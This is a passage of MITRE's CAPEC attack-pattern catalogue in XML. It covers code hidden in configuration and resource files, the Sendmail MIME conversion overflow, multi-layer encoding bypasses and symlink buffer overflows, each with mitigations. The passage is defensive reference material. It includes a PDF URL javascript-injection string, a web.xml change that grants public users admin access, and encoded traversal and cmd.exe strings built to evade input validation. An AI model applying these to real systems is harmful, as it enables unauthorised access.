               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Status, Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Extended_Description, Indicators, Mitigations, Notes, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Alternate_Terms, Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="35" Name="Leverage Executable Code in Non-Executable Files" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="636" />
            <ns0:Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="23" />
            <ns0:Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="75" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The attacker must have the ability to modify non-executable files consumed by the target software.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To identify and execute against an over-privileged system interface</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Enforce principle of least privilege</ns0:Mitigation>
            <ns0:Mitigation>Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Implement host integrity monitoring to detect any unwanted altering of configuration files.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Ensure that files that are not required to execute, such as configuration files, are not over-privileged, i.e. not allowed to execute.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Virtually any system that relies on configuration files for runtime behavior is open to this attack vector. The configuration files are frequently stored in predictable locations, so an attacker that can fingerprint a server process such as a web server or database server can quickly identify the likely locale where the configuration is stored. And this is of course not limited to server processes. Unix shells rely on profile files to store environment variables, search paths for programs and so on. If the aliases are changed, then a standard Unix "cp" command can be rerouted to "rm" or other standard command so the user's intention is subverted.</ns0:Example>
            <ns0:Example>The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser.</ns0:Example>
            <ns0:Example>
               <html:p>Another example targets clients reading pdf files. In this case the attacker simply appends javascript to the end of a legitimate url for a pdf (http://www.gnucitizen.org/blog/danger-danger-danger/)</html:p>
               <html:p>http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here</html:p>
               <html:p>The client assumes that they are reading a pdf, but the attacker has modified the resource and loaded executable javascript into the client's browser process.</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>The attack can also target server processes. The attacker edits the resource or configuration file, for example a web.xml file used to configure security permissions for a J2EE app server, adding role name "public" grants all users with the public role the ability to use the administration functionality.</html:p>
               <html:div style="margin-left:1em;" class="informative">&lt; security-constraint&gt;<html:div style="margin-left:1em;">&lt;description&gt;Security processing rules for admin screens&lt;/description&gt;<html:br />&lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;<html:br />&lt;http-method&gt;POST&lt;/http-method&gt;<html:br />&lt;http-method&gt;GET&lt;/http-method&gt;<html:div style="margin-left:1em;">&lt;auth-constraint&gt;<html:div style="margin-left:1em;">&lt;role-name&gt;administrator&lt;/role-name&gt;<html:br />&lt;role-name&gt;public&lt;/role-name&gt;</html:div>
                        <html:br />&lt;/auth-constraint&gt;</html:div>
                  </html:div>
                  <html:br />&lt;/security-constraint&gt;</html:div>
               <html:p>The server trusts its configuration file to be correct, but when they are manipulated, the attacker gains full control.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="94" />
            <ns0:Related_Weakness CWE_ID="96" />
            <ns0:Related_Weakness CWE_ID="95" />
            <ns0:Related_Weakness CWE_ID="97" />
            <ns0:Related_Weakness CWE_ID="272" />
            <ns0:Related_Weakness CWE_ID="59" />
            <ns0:Related_Weakness CWE_ID="282" />
            <ns0:Related_Weakness CWE_ID="270" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1027.006</ns0:Entry_ID>
               <ns0:Entry_Name>Obfuscated Files or Information: HTML Smuggling</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1027.009</ns0:Entry_ID>
               <ns0:Entry_Name>Obfuscated Files or Information:&#160;Embedded Payloads</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1564.009</ns0:Entry_ID>
               <ns0:Entry_Name>Hide Artifacts: Resource Forking</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Description Summary, Examples-Instances, Related_Attack_Patterns, Type (Attack_Pattern -&gt; Relationship)</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="42" Name="MIME Conversion" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target mail server] The adversary identifies a target mail server that they wish to attack.</ns0:Description>
               <ns0:Technique>Use Nmap on a system to identify a mail server service.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine viability of attack] Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4).</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find injection vector] Identify places in the system where vulnerable MIME conversion routines may be used.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft overflow content] The adversary crafts e-mail messages with special headers that will cause a buffer overflow for the vulnerable MIME conversion routine. The intent of this attack is to leverage the overflow for execution of arbitrary code and gain access to the mail server machine, so the adversary will craft an email that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversary's choosing.</ns0:Description>
               <ns0:Technique>Create malicious shellcode that will execute when the program execution is returned to it.</ns0:Technique>
               <ns0:Technique>Use a NOP-sled in the overflow content to more easily "slide" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Overflow the buffer] Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shell code.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target system uses a mail server.</ns0:Prerequisite>
            <ns0:Prerequisite>Mail server vendor has not released a patch for the MIME conversion routine, the patch itself has a security hole or does not fix the original problem, or the patch has not been applied to the user's system.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">It may be trivial to cause a DoS via this attack pattern</ns0:Skill>
            <ns0:Skill Level="High">Causing arbitrary code to execute on the target system.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Stay up to date with third party vendor patches</ns0:Mitigation>
            <ns0:Mitigation>
               <html:p>Disable the 7 to 8 bit conversion. This can be done by removing the F=9 flag from all Mailer specifications in the sendmail.cf file.</html:p>
               <html:p>For example, a sendmail.cf file with these changes applied should look similar to (depending on your system and configuration):</html:p>
               <html:div style="margin-left:1em;" class="informative">Mlocal, P=/usr/libexec/mail.local, F=lsDFMAw5:/|@qrmn, S=10/30, R=20/40,<html:div style="margin-left:1em;">T=DNS/RFC822/X-Unix,<html:br />A=mail -d $u</html:div>
                  <html:br />Mprog, P=/bin/sh, F=lsDFMoqeu, S=10/30, R=20/40,<html:div style="margin-left:1em;">D=$z:/,<html:br />T=X-Unix,<html:br />A=sh -c $u</html:div>
               </html:div>
               <html:p>This can be achieved for the "Mlocal" and "Mprog" Mailers by modifying the ".mc" file to include the following lines:</html:p>
               <html:div style="margin-left:1em;" class="informative">define(`LOCAL_MAILER_FLAGS',<html:div style="margin-left:1em;">ifdef(`LOCAL_MAILER_FLAGS',<html:div style="margin-left:1em;">`translit(LOCAL_MAILER_FLAGS, `9')',<html:br />`rmn'))</html:div>
                  </html:div>
                  <html:br />define(`LOCAL_SHELL_FLAGS',<html:div style="margin-left:1em;">ifdef(`LOCAL_SHELL_FLAGS',<html:div style="margin-left:1em;">`translit(LOCAL_SHELL_FLAGS, `9')',<html:br />`eu'))</html:div>
                  </html:div>
               </html:div>
               <html:p>and then rebuilding the sendmail.cf file using m4(1).</html:p>
               <html:p>From "Exploiting Software", please see reference below.</html:p>
            </ns0:Mitigation>
            <ns0:Mitigation>Use the sendmail restricted shell program (smrsh)</ns0:Mitigation>
            <ns0:Mitigation>Use mail.local</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>A MIME conversion buffer overflow exists in Sendmail versions 8.8.3 and 8.8.4. Sendmail versions 8.8.3 and 8.8.4 are vulnerable to a buffer overflow in the MIME handling code. By sending a message with specially-crafted headers to the server, a remote attacker can overflow a buffer and execute arbitrary commands on the system with root privileges.</html:p>
               <html:p>Sendmail performs a 7 bit to 8 bit conversion on email messages. This vulnerability is due to the fact that insufficient bounds checking was performed while performing these conversions. This gave attacker an opportunity to overwrite the internal stack of sendmail while it is executing with root privileges. An attacker first probes the target system to figure out what mail server is used on the system and what version. An attacker could then test out the exploit at their leisure on their own machine running the same version of the mail server before using it in the wild.</html:p>See also: CVE-1999-0047</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="119" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
            <ns0:Reference External_Reference_ID="REF-364" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="43" Name="Exploiting Multiple Input Interpretation Layers" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker supplies the target software with input data that contains sequences of special characters designed to bypass input validation logic. This exploit relies on the target making multiples passes over the input data and processing a "layer" of special characters with each pass. In this manner, the attacker can disguise input that would otherwise be rejected as invalid by concealing it with layers of special/escape characters that are stripped off by subsequent processing steps. The goal is to first discover cases where the input validation layer executes before one or more parsing layers. That is, user input may go through the following logic in an application: &lt;parser1&gt; --&gt; &lt;input validator&gt; --&gt; &lt;parser2&gt;. In such cases, the attacker will need to provide input that will pass through the input validator, but after passing through parser2, will be converted into something that the input validator was supposed to stop.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine application/system inputs where bypassing input validation is desired] The attacker first needs to determine all of the application's/system's inputs where input validation is being performed and where they want to bypass it.</ns0:Description>
               <ns0:Technique>While using an application/system, the attacker discovers an input where validation is stopping them from performing some malicious or unauthorized actions.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Determine which character encodings are accepted by the application/system] The attacker then needs to provide various character encodings to the application/system and determine which ones are accepted. The attacker will need to observe the application's/system's response to the encoded data to determine whether the data was interpreted properly.</ns0:Description>
               <ns0:Technique>Determine which escape characters are accepted by the application/system. A common escape character is the backslash character, '\'</ns0:Technique>
               <ns0:Technique>Determine whether URL encoding is accepted by the application/system.</ns0:Technique>
               <ns0:Technique>Determine whether UTF-8 encoding is accepted by the application/system.</ns0:Technique>
               <ns0:Technique>Determine whether UTF-16 encoding is accepted by the application/system.</ns0:Technique>
               <ns0:Technique>Determine if any other encodings are accepted by the application/system.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Combine multiple encodings accepted by the application.] The attacker now combines encodings accepted by the application. The attacker may combine different encodings or apply the same encoding multiple times.</ns0:Description>
               <ns0:Technique>Combine same encoding multiple times and observe its effects. For example, if special characters are encoded with a leading backslash, then the following encoding may be accepted by the application/system: "\\\.". With two parsing layers, this may get converted to "\." after the first parsing layer, and then, to "." after the second. If the input validation layer is between the two parsing layers, then "\\\.\\\." might pass a test for ".." but still get converted to ".." afterwards. This may enable directory traversal attacks.</ns0:Technique>
               <ns0:Technique>Combine multiple encodings and observe the effects. For example, the attacker might encode "." as "\.", and then, encode "\." as "&amp;#92;&amp;#46;", and then, encode that using URL encoding to "%26%2392%3B%26%2346%3B"</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Leverage ability to bypass input validation] Attacker leverages their ability to bypass input validation to gain unauthorized access to system. There are many attacks possible, and a few examples are mentioned here.</ns0:Description>
               <ns0:Technique>Gain access to sensitive files.</ns0:Technique>
               <ns0:Technique>Perform command injection.</ns0:Technique>
               <ns0:Technique>Perform SQL injection.</ns0:Technique>
               <ns0:Technique>Perform XSS attacks.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>User input is used to construct a command to be executed on the target system or as part of the file name.</ns0:Prerequisite>
            <ns0:Prerequisite>Multiple parser passes are performed on the data supplied by the user.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Knowledge of various escaping schemes, such as URL escape encoding and XML escape characters.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>Control characters are being detected by the filters repeatedly.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>An iterative approach to input validation may be required to ensure that no dangerous characters are present. It may be necessary to implement redundant checking across different input validation layers. Ensure that invalid data is rejected as soon as possible and do not continue to work with it.</ns0:Mitigation>
            <ns0:Mitigation>Make sure to perform input validation on canonicalized data (i.e. data that is data in its most standard form). This will help avoid tricky encodings getting past the filters.</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist would not be permitted to enter into the system.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>The backslash character provides a good example of the multiple-parser issue. A backslash is used to escape characters in strings, but is also used to delimit directories on the NT file system. When performing a command injection that includes NT paths, there is usually a need to "double escape" the backslash. In some cases, a quadruple escape is necessary.</html:p>
               <html:div style="margin-left:1em;" class="informative">Original String: C:\\\\winnt\\\\system32\\\\cmd.exe /c<html:br />
                  <html:br />&lt;parsing layer&gt;<html:br />
                  <html:br />Interim String: C:\\winnt\\system32\\cmd.exe /c<html:br />
                  <html:br />&lt;parsing layer&gt;<html:br />
                  <html:br />Final String: C:\winnt\system32\cmd.exe /c</html:div>
               <html:p>This diagram shows each successive layer of parsing translating the backslash character. A double backslash becomes a single as it is parsed. By using quadruple backslashes, the attacker is able to control the result in the final string.</html:p>
               <html:p>[REF-1]</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="179" />
            <ns0:Related_Weakness CWE_ID="181" />
            <ns0:Related_Weakness CWE_ID="184" />
            <ns0:Related_Weakness CWE_ID="183" />
            <ns0:Related_Weakness CWE_ID="77" />
            <ns0:Related_Weakness CWE_ID="78" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Description, Description Summary, References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Execution_Flow, Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="45" Name="Buffer Overflow via Symbolic Links" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This type of attack leverages the use of symbolic links to cause buffer overflows. An adversary can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target application] The adversary identifies a target application or program that might load in certain files to memory.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.</ns0:Description>
               <ns0:Technique>The adversary creates or modifies a symbolic link pointing to those files which contain an excessive amount of data. If creating a symbolic link to one of those files causes different behavior in the application, then an injection vector has been identified.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft overflow file content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.</ns0:Description>
               <ns0:Technique>Create malicious shellcode that will execute when the program execution is returned to it.</ns0:Technique>
               <ns0:Technique>Use a NOP-sled in the overflow content to more easily "slide" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Overflow the buffer] Using the specially crafted file content, the adversary creates a symbolic link from the identified resource to the malicious file, causing a targeted buffer overflow attack.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The adversary can create symbolic link on the target host.</ns0:Prerequisite>
            <ns0:Prerequisite>The target host does not perform correct boundary checking while consuming data from a resources.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
